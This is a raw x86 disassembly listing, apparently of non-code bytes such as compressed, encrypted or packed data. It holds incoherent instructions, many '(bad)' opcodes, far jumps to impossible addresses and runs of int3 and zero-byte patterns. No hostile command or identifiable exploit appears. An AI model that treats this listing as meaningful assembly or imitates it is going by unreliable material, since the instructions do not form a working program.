  4349ed:	jne    0x4349f1
  4349ef:	ror    BYTE PTR [esi+0x4c],1
  4349f2:	fdivr  DWORD PTR [edx-0x23285bae]
  4349f8:	and    esi,DWORD PTR [ecx]
  4349fa:	inc    esp
  4349fb:	out    0x82,eax
  4349fd:	xor    DWORD PTR [ebx],ecx
  4349ff:	ds jnp 0x434a39
  434a02:	cmp    DWORD PTR [edx],edi
  434a04:	jnp    0x434a1c
  434a06:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  434a08:	pcmpeqw mm0,mm6
  434a0b:	fwait
  434a0c:	mov    bh,0x0
  434a0e:	add    BYTE PTR [eax],al
  434a10:	add    BYTE PTR [eax],al
  434a12:	sub    edi,eax
  434a14:	mov    bl,0xb7
  434a16:	inc    ecx
  434a17:	(bad)  
  434a18:	stos   DWORD PTR es:[edi],eax
  434a19:	mov    bh,0x39
  434a1b:	(bad)  
  434a1c:	sbb    al,0x7b
  434a1e:	adc    DWORD PTR [esp-0x10ba0e08],ecx
  434a25:	push   ebx
  434a26:	pop    ebx
  434a27:	add    cl,ch
  434a29:	add    edx,DWORD PTR [ebx+0x2]
  434a2c:	mov    eax,0x4ad60bdb
  434a31:	out    0x3e,al
  434a33:	(bad)  
  434a34:	out    dx,eax
  434a35:	add    eax,ecx
  434a37:	(bad)  
  434a38:	sub    esi,DWORD PTR [edi+0x7a9cc6b9]
  434a3e:	shl    DWORD PTR [ebx],1
  434a40:	xchg   edx,eax
  434a41:	jp     0x434a81
  434a43:	or     ch,BYTE PTR [edx]
  434a45:	add    esi,DWORD PTR [ebp+0x2]
  434a48:	out    0x3,eax
  434a4a:	lock mov esp,0xd7a2fe2a
  434a50:	out    0x3,eax
  434a52:	cmc    
  434a53:	jecxz  0x434a3b
  434a55:	inc    esi
  434a56:	mov    ah,0x0
  434a58:	out    0x3,eax
  434a5a:	jne    0x434a5e
  434a5c:	add    BYTE PTR [ecx-0x71],ch
  434a5f:	xlat   BYTE PTR ds:[ebx]
  434a60:	ret    0x76e8
  434a63:	add    al,BYTE PTR [eax]
  434a65:	jmp    0xa6579e27
  434a6a:	jbe    0x434a6e
  434a6c:	add    cl,ch
  434a6e:	test   al,0x0
  434a71:	jmp    0x0:0xae000276
  434a78:	add    BYTE PTR [eax],al
  434a7a:	add    BYTE PTR [ebx-0x28],dl
  434a7d:	stc    
  434a7e:	jmp    0xc00085f9
  434a83:	aaa    
  434a84:	(bad)  
  434a85:	jae    0x434a66
  434a87:	stc    
  434a88:	(bad)  
  434a89:	stc    
  434a8a:	jmp    0xea050d05
  434a8f:	jne    0x434a93
  434a91:	add    cl,ch
  434a93:	mov    ebx,0x19abf295
  434a98:	push   ebx
  434a99:	or     al,0xae
  434a9b:	jbe    0x434a9f
  434a9d:	add    cl,ch
  434a9f:	rol    DWORD PTR ss:[eax],0xeb
  434aa3:	jbe    0x434aa7
  434aa5:	add    BYTE PTR [esp+esi*1],cl
  434aa8:	(bad)  
  434aa9:	int3   
  434aaa:	xor    eax,0x2dccc62d
  434aaf:	sub    eax,0xb91accc6
  434ab4:	cmp    cl,0xd5
  434ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434ab8:	push   ebp
  434ab9:	stc    
  434aba:	inc    esi
  434abb:	inc    ebp
  434abc:	sbb    eax,0xa2c974d
  434ac1:	sub    eax,0x4ed71f12
  434ac6:	cs push 0xfffffff6
  434ac9:	retf   
  434aca:	stos   BYTE PTR es:[edi],al
  434acb:	jbe    0x434b4a
  434acd:	lock push 0xffffffb5
  434ad0:	add    eax,0x6121f83
  434ad5:	push   ecx
  434ad6:	push   cs
  434ad7:	push   0xfffffffe
  434ad9:	or     al,0x0
  434adb:	fadd   QWORD PTR [edx]
  434add:	add    esi,0x0
  434ae0:	add    BYTE PTR [eax],al
  434ae2:	add    BYTE PTR [eax],al
  434ae4:	jmp    0x82d6:0xea89bb49
  434aeb:	ds jmp 0xcc8e:0x28ccbb49
  434af3:	int3   
  434af4:	sbb    BYTE PTR [esi+0x5ba1cccc],cl
  434afa:	in     al,dx
  434afb:	mov    esp,DWORD PTR [ecx+0x2cec7aee]
  434b01:	dec    eax
  434b02:	dec    edi
  434b03:	lea    edx,[ecx-0x7e72af1a]
  434b09:	into   
  434b0a:	test   DWORD PTR [ebp+0x0],eax
  434b0d:	dec    ebp
  434b0e:	inc    ebp
  434b0f:	cld    
  434b10:	dec    edi
  434b11:	fucomip st,st(0)
  434b13:	xor    DWORD PTR [ebx],ecx
  434b15:	fcomip st,st(7)
  434b17:	mov    ebx,DWORD PTR [ecx-0x26]
  434b1a:	jl     0x434ae0
  434b1c:	adc    BYTE PTR [ebp-0x3f],dl
  434b1f:	je     0x434b3c
  434b21:	pop    ebx
  434b22:	cmp    eax,0x74c191fc
  434b27:	sbb    BYTE PTR [edi+0x5e57f844],dl
  434b2d:	pop    ebx
  434b2e:	dec    ebp
  434b2f:	hlt    
  434b30:	cs pop ebx
  434b32:	dec    ebp
  434b33:	lock and esi,DWORD PTR [eax+edx*2]
  434b37:	push   ecx
  434b38:	dec    ebx
  434b39:	add    al,0x40
  434b3b:	adc    cl,BYTE PTR [edx+eax*1]
  434b3e:	cmp    eax,0x24
  434b41:	push   edx
  434b42:	idiv   edi
  434b44:	mov    edi,DWORD PTR [esi]
  434b46:	push   esi
  434b47:	mov    eax,DWORD PTR [eax]
  434b49:	add    BYTE PTR [eax],al
  434b4b:	add    BYTE PTR [eax],al
  434b4d:	xor    DWORD PTR [ebx+edi*4],edi
  434b50:	int3   
  434b51:	pop    eax
  434b52:	(bad)  
  434b53:	int3   
  434b54:	int3   
  434b55:	push   0x58cccc8d
  434b5a:	(bad)  
  434b5b:	int3   
  434b5c:	int3   
  434b5d:	jne    0x434af5
  434b5f:	js     0x434b4d
  434b61:	inc    esp
  434b62:	lea    edi,[eax+0x73]
  434b65:	sbb    DWORD PTR [eax-0x28cf7843],0x9a09f27b
  434b6f:	js     0x434b7b
  434b71:	lock and ch,BYTE PTR [ecx+0x25]
  434b75:	(bad)  
  434b76:	adc    eax,0x1df84ff8
  434b7b:	loopne 0x434bcd
  434b7d:	out    dx,al
  434b7e:	and    eax,0x1ac54df4
  434b83:	fst    QWORD PTR [ebx]
  434b85:	mov    ecx,0xf0003db9
  434b8a:	stos   BYTE PTR es:[edi],al
  434b8b:	push   edi
  434b8c:	adc    BYTE PTR [edx-0x4a],al
  434b8f:	or     DWORD PTR ds:0xf882ebb5,ecx
  434b95:	pop    ebx
  434b96:	test   BYTE PTR [ecx],0x2d
  434b99:	xor    eax,0xee044652
  434b9e:	and    eax,0x7dee5ae0
  434ba3:	aas    
  434ba4:	mov    ebp,0xccd08f41
  434ba9:	cmp    DWORD PTR [edi-0x9ce3330],esp
  434baf:	mov    ah,ch
  434bb1:	add    BYTE PTR [eax],al
  434bb3:	add    BYTE PTR [eax],al
  434bb5:	add    BYTE PTR [ebp+ebp*8-0x77e8c78],ah
  434bbc:	ret    
  434bbd:	xchg   DWORD PTR [eax],esi
  434bbf:	aaa    
  434bc0:	xchg   edx,esi
  434bc2:	imul   edi,edx,0x21f00a88
  434bc8:	pop    eax
  434bc9:	and    eax,0x4ff175fe
  434bce:	clc    
  434bcf:	popf   
  434bd0:	fst    DWORD PTR [eax-0x12]
  434bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434bd4:	in     eax,dx
  434bd5:	dec    ebp
  434bd6:	and    eax,0x4113de7a
  434bdb:	add    dh,ch
  434bdd:	inc    ebx
  434bde:	jne    0x434c5f
  434be0:	daa    
  434be1:	pop    ecx
  434be2:	test   ebp,edx
  434be4:	cld    
  434be5:	punpckhbw mm0,QWORD PTR [edx-0x19]
  434be9:	xchg   BYTE PTR [ebp+0x58057c1b],cl
  434bef:	ret    0x4a70
  434bf2:	jns    0x434b7d
  434bf4:	lods   al,BYTE PTR ds:[esi]
  434bf5:	fistp  WORD PTR [edi]
  434bf7:	mov    DWORD PTR [ecx+eax*2],eax
  434bfa:	xor    bh,al
  434bfc:	mov    bl,0xcf
  434bfe:	cmp    edi,eax
  434c00:	stos   DWORD PTR es:[edi],eax
  434c01:	iret   
  434c02:	xor    edi,eax
  434c04:	cmp    al,0x8f
  434c06:	dec    ecx
  434c07:	cmp    BYTE PTR [ebx+0x3c87a70b],0x10
  434c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434c0f:	(bad)  
  434c11:	xchg   BYTE PTR ds:0x3ccd66d4,ch
  434c17:	sbb    BYTE PTR [edx+0x57],dh
  434c1d:	add    BYTE PTR [eax],al
  434c1f:	mov    dh,0x87
  434c21:	icebp  
  434c22:	push   ds
  434c23:	cmp    al,0x4f
  434c25:	fisubr DWORD PTR [ebp+0x22]
  434c28:	xchg   DWORD PTR [eax+eiz*8],ebp
  434c2b:	lds    ebp,FWORD PTR [ebx]
  434c2d:	cmp    BYTE PTR [ebp+0x6070da8e],cl
  434c33:	or     esp,edx
  434c35:	aam    0x3
  434c37:	jae    0x434c7b
  434c39:	out    0x8c,eax
  434c3b:	mov    dh,0xda
  434c3d:	data16 fucomi st,st(4)
  434c40:	dec    ebp
  434c41:	pop    es
  434c42:	(bad)  
  434c43:	scas   al,BYTE PTR es:[edi]
  434c44:	push   es
  434c45:	test   BYTE PTR [ebx+0x75],0xd3
  434c49:	cmp    cl,BYTE PTR [eax-0x1d07b14b]
  434c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434c50:	mov    DWORD PTR [ecx+0x2f7f2c07],ebp
  434c56:	loop   0x434c98
  434c58:	enter  0x3600,0x34
  434c5c:	jge    0x434c41
  434c5e:	mov    WORD PTR [ebx-0x4debc83],?
  434c64:	das    
  434c65:	cld    
  434c66:	mov    esi,0xb4e37d34
  434c6b:	mov    bl,0xc6
  434c6d:	int3   
  434c6e:	sbb    eax,0x35ccc6c2
  434c73:	mov    edx,0xb22dccc6
  434c78:	(bad)  
  434c79:	int3   
  434c7a:	pushf  
  434c7b:	jmp    0x434c63
  434c7d:	push   edx
  434c7e:	(bad)  
  434c7f:	int    0x6
  434c81:	sub    eax,0xbb
  434c86:	add    BYTE PTR [eax],al
  434c88:	lock leave 
  434c8a:	stc    
  434c8b:	fs aas 
  434c8d:	dec    esi
  434c8e:	(bad)  
  434c8f:	popa   
  434c90:	pop    edi
  434c91:	jle    0x434cde
  434c93:	icebp  
  434c94:	stc    
  434c95:	fiadd  DWORD PTR [eax]
  434c97:	cmp    eax,0xf3743c4d
  434c9c:	scas   eax,DWORD PTR es:[edi]
  434c9d:	dec    edi
  434c9e:	cs jo  0x434d14
  434ca1:	add    al,BYTE PTR [eax]
  434ca3:	jmp    0xe8fa47c9
  434ca8:	jbe    0x434cac
  434caa:	add    BYTE PTR [edx+0x6cc7257b],dl
  434cb0:	jecxz  0x434cff
  434cb2:	and    bh,BYTE PTR [eax]
  434cb4:	add    BYTE PTR [edi+0x10],al
  434cb7:	je     0x434c6b
  434cb9:	out    dx,al
  434cba:	dec    edi
  434cbb:	sbb    BYTE PTR [ebx-0x27],cl
  434cbe:	adc    ebp,ecx
  434cc0:	add    BYTE PTR [ebx],dl
  434cc2:	add    BYTE PTR [edx-0x2f],ch
  434cc5:	fdiv   DWORD PTR [ebx-0xa]
  434cc8:	aad    0xee
  434cca:	or     edi,edx
  434ccc:	add    al,BYTE PTR ss:[edi-0x37aa8d51]
  434cd3:	dec    esi
  434cd4:	aaa    
  434cd5:	aaa    
  434cd6:	mov    ebp,0x56becf00
  434cdb:	pop    ebp
  434cdc:	(bad)  
  434cdd:	mov    dl,0xcc
  434cdf:	int3   
  434ce0:	fld    DWORD PTR [ebp-0x79f4a914]
  434ce6:	jne    0x434cf4
  434ce8:	pop    ds
  434ce9:	mov    al,0xf7
  434ceb:	test   DWORD PTR [eax],eax
  434ced:	add    BYTE PTR [eax],al
  434cef:	add    BYTE PTR [eax],al
  434cf1:	cmp    DWORD PTR [edx],0x13
  434cf4:	mov    ecx,DWORD PTR [ebx-0x6a8b3f85]
  434cfa:	push   cs
  434cfb:	not    DWORD PTR ds:0x39cd98
  434d01:	mov    edi,0x8c6a4fb8
  434d06:	loope  0x434d15
  434d08:	and    BYTE PTR [eax+0x18830047],dl
  434d0e:	(bad)  
  434d0f:	push   esi
  434d10:	mov    ebx,DWORD PTR [edx]
  434d12:	inc    esp
  434d13:	push   ebp
  434d14:	ret    
  434d15:	cdq    
  434d16:	jg     0x434d04
  434d18:	mov    esi,DWORD PTR [ecx-0xe]
  434d1b:	jp     0x434ce5
  434d1d:	xor    ecx,DWORD PTR [ecx+0x7f4f74c1]
  434d23:	cmp    DWORD PTR [ecx+eiz*2],eax
  434d26:	(bad)  
  434d27:	int3   
  434d28:	int3   
  434d29:	adc    dl,al
  434d2b:	int3   
  434d2c:	int3   
  434d2d:	loopne 0x434cf0
  434d2f:	int3   
  434d30:	int3   
  434d31:	rol    cl,1
  434d33:	int3   
  434d34:	int3   
  434d35:	pop    ecx
  434d36:	jg     0x434d24
  434d38:	mov    ebx,DWORD PTR [ecx-0x2]
  434d3b:	mov    esi,0x3ccabc00
  434d40:	add    bl,bl
  434d42:	inc    ebp
  434d43:	add    al,0x0
  434d45:	and    al,0x47
  434d47:	add    bh,al
  434d49:	pushf  
  434d4a:	dec    BYTE PTR [edi+0x18]
  434d4d:	pop    ds
  434d4e:	push   es
  434d4f:	mov    edi,0x18a5d040
  434d54:	inc    ebx
  434d55:	add    BYTE PTR [eax],al
  434d57:	add    BYTE PTR [eax],al
  434d59:	add    BYTE PTR [ebp-0x25],dh
  434d5c:	enter  0x6540,0xcb
  434d60:	idiv   BYTE PTR [esi*2+0x45143d20]
  434d67:	loop   0x434dad
  434d69:	add    BYTE PTR [edx-0x73600a65],dh
  434d6f:	pushf  
  434d70:	std    
  434d71:	shl    BYTE PTR ds:0x75000407,0xdb
  434d78:	cmp    bh,BYTE PTR [esi-0x3336248f]
  434d7e:	shr    edi,0xc8
  434d81:	int3   
  434d82:	mov    ecx,0xb1ccc917
  434d87:	pop    ds
  434d88:	leave  
  434d89:	int3   
  434d8a:	test   eax,0x91598c6c
  434d8f:	jns    0x434dc5
  434d91:	call   0x477476
  434d96:	out    dx,al
  434d97:	sub    edi,eax
  434d99:	test   BYTE PTR [edx+0x79c47ecb],dh
  434d9f:	hlt    
  434da0:	shl    DWORD PTR [edx+0x77],cl
  434da3:	push   esp
  434da4:	aam    0x83
  434da6:	dec    ebx
  434da7:	pop    ss
  434da8:	sub    al,0x85
  434daa:	mov    dh,0xab
  434dac:	xchg   BYTE PTR [ecx-0x7f],cl
  434daf:	stc    
  434db0:	xor    ecx,DWORD PTR [edi+0x1d]
  434db3:	pop    DWORD PTR [ebx+0x0]
  434db6:	jne    0x434d92
  434db8:	push   edx
  434db9:	or     al,0x74
  434dbb:	in     al,dx
  434dbc:	repz inc BYTE PTR [eax]
  434dbf:	add    BYTE PTR [eax],al
  434dc1:	add    BYTE PTR [eax],al
  434dc3:	mov    edx,edi
  434dc5:	sub    al,0x71
  434dc7:	gs pop esp
  434dc9:	enter  0x4c0c,0xcc
  434dcd:	icebp  
  434dce:	jb     0x434e43
  434dd0:	fs sub eax,0xf3ebfc08
  434dd6:	pop    ecx
  434dd7:	dec    esi
  434dd8:	add    ah,BYTE PTR [esi]
  434dda:	shl    BYTE PTR [ecx-0x562fd443],1
  434de0:	mov    ebp,0x37e18abc
  434de5:	pop    esi
  434de6:	pop    ecx
  434de7:	jge    0x434d70
  434de9:	cmp    DWORD PTR [edi],ecx
  434deb:	stc    
  434dec:	ret    
  434ded:	out    0x3,eax
  434def:	jne    0x434e6e
  434df1:	test   eax,0xdac1f7ff
  434df6:	xchg   esp,esp
  434df8:	add    edi,esp
  434dfa:	add    eax,DWORD PTR [ebp+edi*2-0x61]
  434dfe:	pop    es
  434dff:	sbb    cl,dl
  434e01:	mov    ebp,0xa856157
  434e06:	dec    ecx
  434e07:	add    DWORD PTR [ecx],ebp
  434e09:	data16 fistp QWORD PTR [edx]
  434e0c:	push   esi
  434e0d:	lds    eax,FWORD PTR [edx+0x7b2c7c]
  434e13:	lock iret 
  434e15:	adc    BYTE PTR [edi-0x73],0x83
  434e19:	loop   0x434e6f
  434e1b:	jmp    0x421b613
  434e20:	add    eax,0xfbc903e7
  434e25:	sub    DWORD PTR [eax+eax*1+0x0],ebx
  434e2c:	dec    edi
  434e2d:	rol    dl,1
  434e2f:	ficomp WORD PTR [edi+0x7507a52d]
  434e35:	jnp    0x434e5e
  434e37:	or     al,0xf6
  434e39:	ret    0x1133
  434e3c:	lock inc eax
  434e3e:	retf   
  434e3f:	xor    edi,eax
  434e41:	dec    eax
  434e42:	iret   
  434e43:	xor    ebx,DWORD PTR [edx+esi*4]
  434e46:	data16 (bad) 
  434e48:	jge    0x434ec5
  434e4a:	xor    DWORD PTR [eax],eax
  434e4c:	lock inc esp
  434e4e:	sub    ecx,DWORD PTR [ecx-0x7513a8cb]
  434e54:	scas   eax,DWORD PTR es:[edi]
  434e55:	add    BYTE PTR es:[ecx],bl
  434e58:	inc    BYTE PTR [eax+ebp*1+0x19]
  434e5c:	retf   0x7dbf
  434e5f:	sub    eax,0xfd52856e
  434e64:	out    dx,eax
  434e65:	adc    BYTE PTR [eax+0x6c],al
  434e68:	mov    dh,0x56
  434e6a:	or     esp,DWORD PTR [edx+0x38]
  434e6d:	es push eax
  434e6f:	jb     0x434ea9
  434e71:	sbb    dl,BYTE PTR [eax+0x3e]
  434e74:	add    DWORD PTR [esi-0x3c],ecx
  434e77:	loope  0x434e78
  434e79:	xor    al,0x1c
  434e7b:	bound  esi,QWORD PTR [edx+ecx*1]
  434e7e:	sub    DWORD PTR [ecx],0x4a
  434e81:	sti    
  434e82:	test   BYTE PTR [edi-0x507acdae],ch
  434e88:	pop    esi
  434e89:	xor    bh,cl
  434e8b:	cmp    bh,dh
  434e8d:	(bad)  
  434e8e:	or     BYTE PTR [edx+0x0],dh
  434e91:	add    BYTE PTR [eax],al
  434e93:	add    BYTE PTR [eax],al
  434e95:	dec    eax
  434e96:	out    dx,al
  434e97:	test   BYTE PTR [edi-0x32b57ab2],ah
  434e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434e9e:	xor    bh,cl
  434ea0:	sbb    bh,dh
  434ea2:	lds    ecx,FWORD PTR [eax]
  434ea4:	sbb    bh,BYTE PTR [ecx]
  434ea6:	dec    ebp
  434ea7:	stc    
  434ea8:	pop    eax
  434ea9:	push   0x3836c073
  434eae:	inc    esp
  434eaf:	sbb    al,0xe9
  434eb1:	jbe    0x434eb5
  434eb3:	add    BYTE PTR [edi],ah
  434eb5:	mov    cl,0x4d
  434eb7:	loopne 0x434e75
  434eb9:	jp     0x434e4b
  434ebb:	add    al,0xe9
  434ebd:	push   cs
  434ebe:	int3   
  434ebf:	stc    
  434ec0:	scas   al,BYTE PTR es:[edi]
  434ec1:	dec    eax
  434ec2:	sub    al,0x5b
  434ec4:	stos   DWORD PTR es:[edi],eax
  434ec5:	ins    DWORD PTR es:[edi],dx
  434ec6:	add    cl,ah
  434ec8:	lods   eax,DWORD PTR ds:[esi]
  434ec9:	inc    ebp
  434eca:	mov    esi,0x6bb62cc
  434ecf:	push   ecx
  434ed0:	bound  ebp,QWORD PTR [ecx]
  434ed2:	adc    eax,0x10200f7
  434ed7:	cmp    ecx,0xffffff91
  434eda:	lods   eax,DWORD PTR ds:[esi]
  434edb:	ins    DWORD PTR es:[edi],dx
  434edc:	add    al,0x2f
  434ede:	ret    
  434edf:	push   edi
  434ee0:	ret    
  434ee1:	mov    bh,0xc5
  434ee3:	add    DWORD PTR [esi-0x30],0x1c56fe79
  434eea:	adc    ch,al
  434eec:	lods   eax,DWORD PTR ds:[esi]
  434eed:	sbb    al,0x3
  434eef:	add    BYTE PTR [ebx+0x4184ceea],cl
  434ef5:	aam    0x81
  434ef7:	les    ecx,FWORD PTR [eax+eax*1]
  434efa:	add    BYTE PTR [eax],al
  434efc:	add    BYTE PTR [eax],al
  434efe:	dec    edi
  434eff:	scas   al,BYTE PTR es:[edi]
  434f00:	stc    
  434f01:	je     0x434ed6
  434f03:	jns    0x434f53
  434f05:	xor    BYTE PTR [ebx],al
  434f07:	adc    cl,BYTE PTR [edx-0x18]
  434f0a:	mov    al,0xec
  434f0c:	(bad)  
  434f0d:	dec    DWORD PTR [ebp-0x6b820714]
  434f13:	jnp    0x434f53
  434f15:	xor    BYTE PTR [edi],dl
  434f17:	lds    edx,FWORD PTR [edi-0x3d]
  434f1a:	(bad)  
  434f1c:	cli    
  434f1d:	je     0x434ea9
  434f1f:	jns    0x434f5f
  434f21:	xor    BYTE PTR [ebx],dl
  434f23:	adc    edx,DWORD PTR [eax-0x18]
  434f26:	inc    esp
  434f27:	sub    BYTE PTR [eax],al
  434f29:	add    ch,ah
  434f2b:	inc    edi
  434f2c:	xor    BYTE PTR [ecx],al
  434f2e:	jp     0x434f31
  434f30:	jbe    0x434f3a
  434f32:	xlat   BYTE PTR ds:[ebx]
  434f33:	(bad)  
  434f34:	push   edi
  434f35:	ret    
  434f36:	call   0x9101bf8
  434f3b:	mov    esi,0xbe08cccc
  434f40:	int3   
  434f41:	int3   
  434f42:	xchg   ecx,eax
  434f43:	jnp    0x434f31
  434f45:	push   ecx
  434f46:	(bad)  
  434f47:	jnp    0x434fa0
  434f49:	sub    al,0x62
  434f4b:	jns    0x434fa2
  434f4d:	cld    
  434f4e:	pop    es
  434f4f:	add    eax,0x6075ff83
  434f54:	cmp    bh,ah
  434f56:	(bad)  
  434f57:	hlt    
  434f58:	pop    ds
  434f59:	and    eax,0x4188cf8a
  434f5e:	mov    DWORD PTR [eax+0x4c],edx
  434f61:	sub    al,0x0
  434f63:	add    BYTE PTR [eax],al
  434f65:	add    BYTE PTR [eax],al
  434f67:	add    BYTE PTR [eax],dh
  434f69:	or     dh,dh
  434f6b:	jmp    0x434fc9
  434f6d:	fsub   QWORD PTR ds:0x6ebe20e5
  434f73:	cmp    BYTE PTR [eax+0x44],dl
  434f76:	cmp    BYTE PTR [esi],ah
  434f78:	or     WORD PTR [eax],bx
  434f7b:	and    al,0x8b
  434f7d:	in     eax,0x22
  434f7f:	xor    eax,0x2284fddb
  434f84:	lahf   
  434f85:	mov    BYTE PTR [ecx+0x39],al
  434f88:	add    bh,BYTE PTR [ebx]
  434f8a:	jo     0x434fe8
  434f8c:	jl     0x434ff7
  434f8e:	jge    0x434f49
  434f90:	xlat   BYTE PTR ds:[ebx]
  434f91:	es pop ecx
  434f93:	cmp    DWORD PTR [esi+0x9],ebx
  434f96:	push   eax
  434f97:	in     eax,0xe4
  434f99:	xchg   esp,eax
  434f9a:	aas    
  434f9b:	mov    ebx,DWORD PTR [eax-0x1a]
  434f9e:	(bad)  
  434f9f:	aas    
  434fa0:	sbb    BYTE PTR [edi+0x4],cl
  434fa3:	dec    esi
  434fa4:	sbb    al,ch
  434fa6:	(bad)  
  434fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434fa8:	sbb    eax,DWORD PTR [edi+0x62]
  434fab:	cld    
  434fac:	fst    DWORD PTR [edx-0x19]
  434faf:	out    dx,al
  434fb0:	adc    eax,DWORD PTR [ebp+eax*4+0x46]
  434fb4:	pop    esi
  434fb5:	or     BYTE PTR [edi-0x1b],dl
  434fb8:	jecxz  0x434f48
  434fba:	aas    
  434fbb:	dec    ebx
  434fbc:	pop    eax
  434fbd:	jmp    0x434fbd
  434fbf:	jg     0x434f59
  434fc1:	push   edx
  434fc2:	add    al,0x8e
  434fc4:	cwde   
  434fc5:	jmp    0x4adeb7c8
  434fca:	bound  eax,QWORD PTR [eax]
  434fcc:	add    BYTE PTR [eax],al
  434fce:	add    BYTE PTR [eax],al
  434fd0:	cld    
  434fd1:	fst    DWORD PTR [eax-0x19]
  434fd4:	jbe    0x434fd8
  434fd6:	xchg   esi,eax
  434fd7:	(bad)  
  434fd8:	je     0x434f5b
  434fda:	pop    ds
  434fdb:	add    BYTE PTR [ebp-0x3],dh
  434fde:	push   0xffffff94
  434fe0:	jne    0x434fe4
  434fe2:	out    0x8e,eax
  434fe4:	pushf  
  434fe5:	push   esi
  434fe6:	out    0x3a,al
  434fe8:	mov    DWORD PTR [ecx-0x57],edi
  434feb:	pop    es
  434fec:	dec    esp
  434fed:	or     bl,BYTE PTR [esi-0x2c]
  434ff0:	fstp   st(2)
  434ff2:	imul   ebx,ebx,0x4faa02dc
  434ff8:	lock inc esp
  434ffa:	ror    DWORD PTR [esi+0x3f99604],cl
  435000:	jne    0x435081
  435002:	repz add DWORD PTR [eax-0x38],eax
  435006:	out    0x55,al
  435008:	inc    esi
  435009:	jns    0x434f9d
  43500b:	addr16 clc 
  43500d:	sub    al,0xef
  43500f:	mov    ?,WORD PTR [edx+ebp*1]
  435012:	(bad)  
  435013:	mov    cl,0x6c
  435015:	xchg   esp,eax
  435016:	jmp    0x43500e
  435018:	repz inc esp
  43501a:	scas   eax,DWORD PTR es:[edi]
  43501b:	mov    dh,0x95
  43501d:	cld    
  43501e:	pop    eax
  43501f:	dec    eax
  435020:	js     0x435025
  435022:	(bad)  
  435023:	les    esp,FWORD PTR [eax+0x45]
  435026:	fwait
  435027:	mov    WORD PTR [edx+edi*1],?
  43502a:	fs shr cl,cl
  43502d:	xor    bl,BYTE PTR [esi+0x53]
  435030:	mov    ebp,0x3b9a77
  435035:	add    BYTE PTR [eax],al
  435037:	add    BYTE PTR [eax],al
  435039:	clc    
  43503a:	inc    ebx
  43503b:	pop    ds
  43503c:	or     esp,DWORD PTR [edi]
  43503e:	inc    edi
  43503f:	test   DWORD PTR ds:0xb7272bf8,0x401a7857
  435049:	nop
  43504a:	les    eax,FWORD PTR [esi]
  43504c:	inc    ebx
  43504d:	mov    eax,ds:0xfa103277
  435052:	inc    ebx
  435053:	add    BYTE PTR [ecx],ah
  435055:	xchg   edi,eax
  435056:	test   DWORD PTR [eax+ebp*1],eax
  435059:	pop    edx
  43505a:	fsub   QWORD PTR [edx+0x70]
  43505d:	sbb    bl,BYTE PTR [edi-0x7b]
  435060:	rol    DWORD PTR cs:[ebp-0x7c68d2bf],0x14
  435068:	and    DWORD PTR [esi],ebx
  43506a:	jp     0x435020
  43506c:	fbstp  TBYTE PTR [esi+0x2]
  43506f:	test   DWORD PTR [esi+0x2],esp
  435072:	icebp  
  435073:	(bad)  
  435074:	call   0xeab78a74
  435079:	scas   al,BYTE PTR es:[edi]
  43507a:	or     al,0x7d
  43507c:	pusha  
  43507d:	jae    0x4350db
  43507f:	add    al,0x64
  435081:	mov    dh,0x4f
  435083:	mov    al,0x68
  435085:	das    
  435086:	push   esi
  435087:	add    ch,al
  435089:	jbe    0x43508d
  43508b:	ins    DWORD PTR es:[edi],dx
  43508c:	cmc    
  43508d:	jmp    0x435080
  43508f:	jl     0x435054
  435091:	mov    dl,0xcb
  435093:	or     ch,BYTE PTR [ebx+edi*4-0x38]
  435097:	stc    
  435098:	cs repz add eax,0xff
  4350a0:	add    BYTE PTR [eax],al
  4350a2:	jbe    0x4350a6
  4350a4:	test   DWORD PTR [esi-0x6540ea96],ebp
  4350aa:	pop    ss
  4350ab:	test   DWORD PTR [ecx-0x6b],esi
  4350ae:	jnp    0x435101
  4350b0:	ins    BYTE PTR es:[edi],dx
  4350b1:	ret    0x5db4
  4350b4:	sub    dl,dl
  4350b6:	cmp    al,0x85
  4350b8:	xlat   BYTE PTR ds:[ebx]
  4350b9:	push   0xe900cc4b
  4350be:	jbe    0x435110
  4350c0:	add    esp,DWORD PTR [edx-0x1606348d]
  4350c6:	add    DWORD PTR [ecx+0x38],eax
  4350c9:	jmp    0x974:0xc1503d34
  4350d0:	add    BYTE PTR [eax],al
  4350d2:	dec    esp
  4350d3:	xchg   ah,al
  4350d5:	or     BYTE PTR [edi],bl
  4350d7:	mov    DWORD PTR [esi-0x77],edx
  4350da:	ret    
  4350db:	(bad)  
  4350dc:	push   cs
  4350dd:	add    BYTE PTR [esi+ecx*1],cl
  4350e0:	and    ebp,0xffffffb1
  4350e3:	lds    eax,FWORD PTR [ebp+0x1e96]
  4350e9:	add    BYTE PTR [edi],ah
  4350eb:	lds    ebp,FWORD PTR [ebx+0x25]
  4350ee:	aaa    
  4350ef:	scas   eax,DWORD PTR es:[edi]
  4350f0:	jns    0x4350b8
  4350f2:	push   cs
  4350f3:	add    BYTE PTR [eax],al
  4350f5:	add    bh,al
  4350f7:	mov    dh,0x33
  4350f9:	icebp  
  4350fa:	jmp    0x3839:0x57f18304
  435101:	add    esp,DWORD PTR [eax+edx*1+0xe849]
  435108:	add    BYTE PTR [eax],al
  43510a:	add    BYTE PTR [eax+ebp*8-0x3da00001],cl
  435111:	or     BYTE PTR [ecx],al
  435113:	jmp    0x4350da
  435115:	push   cs
  435116:	add    ah,cl
  435118:	or     BYTE PTR [ebx-0x75],dl
  43511b:	cmp    DWORD PTR [ebx],edx
  43511d:	mov    ebx,0xec7e09cc
  435122:	push   ecx
  435123:	or     bh,BYTE PTR [esi+0x6d]
  435126:	or     BYTE PTR [edi],ah
  435128:	inc    eax
  435129:	or     al,0x83
  43512b:	pop    esp
  43512c:	lods   eax,DWORD PTR ds:[esi]
  43512d:	dec    edi
  43512e:	(bad)  
  43512f:	fnstenv [edx-0x1730009]
  435135:	xor    al,0xff
  435137:	jae    0x43513f
  435139:	add    BYTE PTR [ebx+0x5f],dh
  43513c:	jge    0x43517b
  43513e:	cld    
  43513f:	xlat   BYTE PTR ds:[ebx]
  435140:	inc    esp
  435141:	je     0x4350c6
  435143:	fs add eax,0xabe7126f
  435149:	call   0xf7ee835f
  43514e:	mov    esi,DWORD PTR [ebp+0x19]
  435151:	push   eax
